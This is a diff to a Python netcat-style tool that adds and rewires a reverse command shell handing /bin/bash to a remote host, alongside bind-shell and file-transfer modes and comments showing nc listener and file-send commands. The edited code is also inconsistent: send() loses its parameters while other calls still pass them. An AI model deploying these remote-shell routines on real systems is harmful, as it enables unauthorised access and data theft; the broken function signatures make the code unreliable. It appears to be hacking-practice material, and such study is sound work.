@@ -25,7 +25,7 @@ parser.add_argument('-r', action='store_true', help='reverse command shell')
 parser.add_argument('-b', action='store_true', help='binding command shell')
 parser.add_argument('-d', nargs='?',type=str, help='download command shell')
 
-opt=parser.parse_args()
+opt = parser.parse_args()
 
 ######### Listen and Send ############
 
@@ -42,10 +42,12 @@ def listen(ip,port):
     print(f'[*] Connecting with {raddr}')
     return s, raddr
 
-def send(ip,port):
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((ip,port))
-    return client
+def send():
+    # client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # client.connect((ip,port))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip,port))
+    return s
 
 ########## shell, command #############
 def execute(cmd):
@@ -65,8 +67,9 @@ def shell_cmd(s):
 
 ############### upload_download_file #################
 
-### Act as a server ####
-## nc 127.0.0.1 6666 < out.txt
+### Act as a server, accept file from a TCP client ####
+## Client side: nc 127.0.0.1 6666 < out.txt
+## Server side: nc -lvnp 6666
 
 def upload(s,raddr,file_name):
     print(f'[*] Uploading file from:{raddr}')
@@ -82,8 +85,9 @@ def upload(s,raddr,file_name):
           print(f'[*] Finished uploading file from:{raddr}')
           break
 
-### Act as a client ###
-## nc -lvnp 6666 < out.txt, nc 120.0.0.1 6666
+### Act as a client, download a file from a TCP server ###
+## Server side: nc -lvnp 6666 < out.txt
+## Client side: nc 120.0.0.1 6666
 
 def download(ip,port,file_name):
     client = send(ip,port)
@@ -104,12 +108,12 @@ def download(ip,port,file_name):
 ################### main ##################################
 
 
-if opt.r and opt.t and opt.p:      ## reverse shell
+if opt.r and opt.t and opt.p:      ## a reverse shell
     ip = opt.t
     port = opt.p
-    raddr = (ip, port)
     cmd = '/bin/bash'
-    shell_cmd(raddr)
+    s = send()
+    shell_cmd(s)
 elif opt.b and opt.t and opt.p:    ## bind shell
     ip = opt.t
     port = opt.p
@@ -126,15 +130,16 @@ elif opt.d and opt.t and opt.p:   ## download file
     port = opt.p
     file_name = opt.d
     download(ip,port,file_name)
-elif opt.t and opt.p:             ## connect with a server
+elif opt.t and opt.p:             ## connect with a TCP server
     ip = opt.t
     port = opt.p
     client = send(ip, port)
     while True:
-        request = 'hi'
-        client.send(request.encode())
-        response = client.recv(1024)
-        print(response.decode())
+         request = input('')
+         client.send(request.encode())
+         response = client.recv(1024)
+
+
 
 
 
